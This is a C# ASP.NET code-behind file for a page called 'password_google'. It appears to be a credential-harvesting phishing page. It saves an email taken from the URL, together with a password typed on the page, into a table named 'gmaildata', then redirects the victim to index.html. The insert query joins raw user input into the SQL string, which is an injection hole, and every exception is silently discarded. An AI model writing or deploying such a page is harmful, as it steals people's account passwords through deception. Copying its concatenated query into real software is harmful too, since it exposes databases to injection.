using System;
using System.Collections.Generic;
using System.Linq;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Drawing;

namespace MinorProject
{
    public partial class password_google : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            try
            {
            }
            catch (Exception ex) { }
        }

        protected void button2_Click(object sender, EventArgs e)
        {
            try
            {
                if (txtpass.Text.Trim() == "")
                {
                    txtpass.BorderColor = Color.Red;
                }
                else
                {
                    string email = Request.QueryString["email"];
                    if (email != "")
                    {
                        string connString = ConfigurationManager.ConnectionStrings["myConnectionString"].ConnectionString;
                        SqlConnection conn = new SqlConnection(connString);
                        conn.Open();

                        SqlCommand cmd = new SqlCommand("insert into gmaildata values('" + email + "', '" + txtpass.Text.Trim() + "') ", conn);
                        SqlDataAdapter da = new SqlDataAdapter(cmd);
                        DataTable dt = new DataTable();
                        da.Fill(dt);
                        Response.Redirect("index.html", false);
                        conn.Close();
                    }
                }
            }
            catch (Exception ex)
            { }
        }
    }


}

